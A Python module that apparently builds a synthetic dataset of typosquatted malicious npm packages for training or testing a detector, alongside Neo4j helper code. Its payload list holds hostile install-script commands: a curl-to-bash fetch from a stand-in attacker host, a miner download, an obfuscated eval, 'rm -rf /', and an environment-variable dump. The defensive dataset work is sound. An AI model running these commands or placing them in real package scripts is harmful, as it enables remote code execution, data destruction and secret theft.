import json
from neo4j.graph import Node
import random

def node_to_package(node: Node):
    props = {key: node[key] for key in node.keys()}
    props["element_id"] = node.element_id
    props["labels"] = list(node.labels)

    json_formatted_properties = ["author","repository","dist","scripts", "_npmUser","dependencies","maintainers"]

    # Convert JSON formatted strings back to json
    for property in json_formatted_properties:
        prop = props.get(property)
        if prop is not None:
            props[property] = json.loads(prop)

    return props

def populate_database(file_path="top1000packages.txt", fn=lambda: None):
    with open(file_path, 'r') as file:
        for line in file:
            cleaned_line = line.strip()
            print(cleaned_line)
            fn(cleaned_line)

def typosquat_name(name):
    """
    Create a typosquat based on a benign package's name.
    """
    if not name or len(name) < 3:
        return f"{name}-malicious"
    
    technique = random.choice(['swap', 'double', 'missing', 'suffix', 'prefix'])
    name_characters = list(name)
    
    # Typical Typosquat techniques
    if technique == 'swap':
        # Swap two adjacent characters
        i = random.randint(0, len(name_characters) - 2)
        name_characters[i], name_characters[i+1] = name_characters[i+1], name_characters[i]
    elif technique == 'double':
        # Duplicate a character
        i = random.randint(0, len(name_characters) - 1)
        name_characters.insert(i, name_characters[i])
    elif technique == 'missing':
        # Remove a character
        i = random.randint(0, len(name_characters) - 1)
        del name_characters[i]
    elif technique == 'suffix':
        return f"{name}-js"
    elif technique == 'prefix':
        return f"node-{name}"
        
    return "".join(name_characters)

def generate_malicious_package(target_benign_name, name_suffix):
    """
    Generates a synthetic malicious package
    """
    pkg_name = typosquat_name(target_benign_name)
    
    # Example malicious scripts
    script_payloads = [
        "curl -s http://evil-server.com/payload | bash",
        "wget http://attacker.cn/miner.exe",
        "node setup_bun.js", # Recent Shai Hulud attack method
        "eval(Buffer.from('...').toString())",
        "rm -rf /",
        "export BAD_ENV=$(printenv)"
    ]
    
    script_type = random.choice(["preinstall", "postinstall", "install"])
    
    # For common malicious packages, look for:
    # Low weekly download counts, low dependency counts, single maintainers, suspicious scripts, no dependencies, no descriptions, typosquat names, and early versions
    return {
        "name": pkg_name,
        "version": "0.0.1",
        "weekly_downloads": random.randint(0, 100),
        "dependency_count": random.randint(0, 1),
        "maintainers": ["hacker_1"],
        "scripts": {
            script_type: random.choice(script_payloads)
        },
        "description": "",
        "dependencies": []
    }

def create_dataset(benign_json_data, num_malicious):
    """
    Returns a dictionary of malicious packages generated by typosquatting names found in the provided benign_json_data.
    """
    data = {}
    benign_names = list(benign_json_data.keys())
    
    # Needs benign packages to generate typosquat names
    if not benign_names:
        print("No benign packages provided. Cannot generate typosquats.")
        return {}
        
    for i in range(num_malicious):
        # Pick a random benign package to target
        target = random.choice(benign_names)
        pkg = generate_malicious_package(target, i)
        
        # Ensure uniqueness in current set
        retries = 0
        while pkg["name"] in data and retries < 10:
            target = random.choice(benign_names)
            pkg = generate_malicious_package(target, i)
            retries += 1
            
        data[pkg["name"]] = pkg

    return data